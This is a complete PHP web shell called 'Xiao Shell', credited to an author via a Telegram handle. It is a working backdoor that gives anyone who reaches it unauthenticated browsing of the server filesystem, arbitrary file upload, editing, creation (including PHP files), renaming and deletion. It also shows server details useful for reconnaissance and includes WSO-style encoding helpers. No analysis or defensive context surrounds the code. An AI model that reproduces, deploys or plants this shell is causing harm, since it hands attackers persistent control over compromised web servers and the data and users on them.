<?php
session_start();

$session_name = "1";

if (isset($_GET['logout'])) {
    session_destroy();
    setcookie($session_name, "", time() - 3600);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$_SESSION[$session_name] = true;
setcookie($session_name, "active", time() + 86400);

$root_dir = getcwd();
$current_path = isset($_GET['path']) ? base64_decode($_GET['path']) : $root_dir;
if (!is_dir($current_path)) $current_path = dirname($current_path);

if (isset($_POST['action']) && $_POST['action'] == 'upload') {
    $target_file = $current_path . '/' . $_FILES['file']['name'];
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) echo "Upload complete.";
}

if (isset($_GET['action']) && $_GET['action'] == 'delete') {
    $target_file = base64_decode($_GET['target']);
    if (is_dir($target_file)) {
        rmdir($target_file);
    } else {
        unlink($target_file);
    }
    header("Location: ?path=" . base64_encode($current_path));
}

if (isset($_POST['action']) && $_POST['action'] == 'save') {
    file_put_contents(base64_decode($_POST['target']), $_POST['content']);
    echo "Saved.";
}

if (isset($_POST['action']) && $_POST['action'] == 'rename') {
    $old_file = base64_decode($_POST['target']);
    $new_file = dirname($old_file) . '/' . $_POST['new_name'];
    if (rename($old_file, $new_file)) {
        echo "Rename successful.";
    } else {
        echo "Rename failed.";
    }
    header("Location: ?path=" . base64_encode($current_path));
}

if (isset($_POST['action']) && $_POST['action'] == 'create_folder') {
    $new_folder = $current_path . '/' . $_POST['folder_name'];
    if (!is_dir($new_folder)) {
        mkdir($new_folder, 0755);
        echo "Folder created.";
    } else {
        echo "Folder already exists.";
    }
    header("Location: ?path=" . base64_encode($current_path));
}

if (isset($_POST['action']) && $_POST['action'] == 'create_file') {
    $new_file = $current_path . '/' . $_POST['file_name'];
    if (!file_exists($new_file)) {
        file_put_contents($new_file, $_POST['file_content'] ?? '');
        echo "File created.";
    } else {
        echo "File already exists.";
    }
    header("Location: ?path=" . base64_encode($current_path));
}

if (isset($_GET['action']) && $_GET['action'] == 'edit') {
    $edit_file = base64_decode($_GET['target']);
}

function wso_encrypt($data, $key) {
    $result = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $char = substr($data, $i, 1);
        $keychar = substr($key, ($i % strlen($key)) - 1, 1);
        $char = chr(ord($char) + ord($keychar));
        $result .= $char;
    }
    return base64_encode($result);
}

function wso_decrypt($data, $key) {
    $result = '';
    $data = base64_decode($data);
    for ($i = 0; $i < strlen($data); $i++) {
        $char = substr($data, $i, 1);
        $keychar = substr($key, ($i % strlen($key)) - 1, 1);
        $char = chr(ord($char) - ord($keychar));
        $result .= $char;
    }
    return $result;
}

?>
<html>
<head><title>Xiao Shell</title>
<style>
body{background:#0a0e1a;color:#0f0;font-family:monospace;padding:20px;}
input,button,textarea{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:8px;margin:5px;}
pre{background:#1a1f2e;padding:10px;overflow:auto;}
table{width:100%;border-collapse:collapse;background:#0a0e1a;}
th,td{border:1px solid #0f0;padding:8px;text-align:left;}
th{background:#1a1f2e;}
a{color:#0f0;text-decoration:none;}
a:hover{text-decoration:underline;}
.footer{text-align:center;padding:15px;color:#666;font-size:12px;border-top:1px solid #1a1f2e;margin-top:20px;}
.footer a{color:#0f0;}
</style>
</head>
<body>

<table width="100%" border="0">
    <tr>
        <td><h2>Xiao Shell / 萧寒</h2></td>
        <td align="right"><a href="?logout=1">Logout</a></td>
    </tr>
</table>
<hr>

<p><b>Location:</b> <?php echo $current_path; ?></p>
<p><a href="?path=<?php echo base64_encode(dirname($current_path)); ?>">[ Go Up ]</a></p>

<form method="POST" enctype="multipart/form-data">
    Upload: <input type="file" name="file">
    <input type="hidden" name="action" value="upload">
    <input type="submit" value="Upload">
</form>

<form method="POST" style="display:inline-block;">
    Create Folder: <input type="text" name="folder_name" placeholder="folder name">
    <input type="hidden" name="action" value="create_folder">
    <input type="submit" value="Create">
</form>

<form method="POST" style="display:inline-block;">
    Create File: <input type="text" name="file_name" placeholder="file.php">
    <input type="hidden" name="action" value="create_file">
    <input type="submit" value="Create">
</form>

<hr>

<table border="0" width="100%">
    <tr>
        <td><b>Server:</b> <?php echo php_uname(); ?></td>
    </tr>
    <tr>
        <td><b>Server IP:</b> <?php echo $_SERVER['SERVER_ADDR'] ?? 'Unknown'; ?></td>
    </tr>
    <tr>
        <td><b>Client IP:</b> <?php echo $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></td>
    </tr>
    <tr>
        <td><b>PHP Version:</b> <?php echo phpversion(); ?></td>
    </tr>
</table>

<hr>

<?php if (isset($_GET['action']) && $_GET['action'] == 'edit'): ?>
    <h3>Edit: <?php echo basename($edit_file); ?></h3>
    <form method="POST">
        <textarea name="content" rows="20" style="width:100%"><?php echo htmlspecialchars(file_get_contents($edit_file)); ?></textarea><br>
        <input type="hidden" name="target" value="<?php echo $_GET['target']; ?>">
        <input type="hidden" name="action" value="save">
        <input type="submit" value="Save"> 
        <a href="?path=<?php echo base64_encode($current_path); ?>">Cancel</a>
    </form>
<?php elseif (isset($_GET['action']) && $_GET['action'] == 'rename'): ?>
    <h3>Rename: <?php echo basename(base64_decode($_GET['target'])); ?></h3>
    <form method="POST">
        <input type="text" name="new_name" value="<?php echo basename(base64_decode($_GET['target'])); ?>" style="width:300px;">
        <input type="hidden" name="target" value="<?php echo $_GET['target']; ?>">
        <input type="hidden" name="action" value="rename">
        <input type="submit" value="Rename"> 
        <a href="?path=<?php echo base64_encode($current_path); ?>">Cancel</a>
    </form>
<?php else: ?>
    <table border="1" width="100%" cellpadding="5" cellspacing="0">
        <tr bgcolor="#1a1f2e">
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Action</th>
        </tr>
        <?php
        $items = @scandir($current_path);
        if ($items === false) {
            echo '<tr><td colspan="4" style="color:#ff4444;">Error: Cannot read directory</td></tr>';
            $items = array();
        }
        $items = array_diff($items, array('.'));
        foreach ($items as $item) {
            $full_path = $current_path . '/' . $item;
            $encoded = base64_encode($full_path);
            if (!file_exists($full_path)) continue;
            echo "<tr>";
            if (is_dir($full_path)) {
                echo "<td><a href='?path=$encoded'><b>$item</b></a></td><td>DIR</td><td>-</td>";
            } else {
                echo "<td>$item</td><td>FILE</td><td>" . filesize($full_path) . " bytes</td>";
            }
            echo "<td>";
            if (is_file($full_path)) echo "<a href='?path=".base64_encode($current_path)."&action=edit&target=$encoded'>Edit</a> | ";
            echo "<a href='?path=".base64_encode($current_path)."&action=rename&target=$encoded'>Rename</a> | ";
            echo "<a href='?path=".base64_encode($current_path)."&action=delete&target=$encoded' onclick=\"return confirm('Delete?')\">Delete</a>";
            echo "</td></tr>";
        }
        ?>
    </table>
<?php endif; ?>

<div class="footer">
    Made by Xiao / 萧寒 &bull; t.me/Xiao8692
</div>

</body>
</html>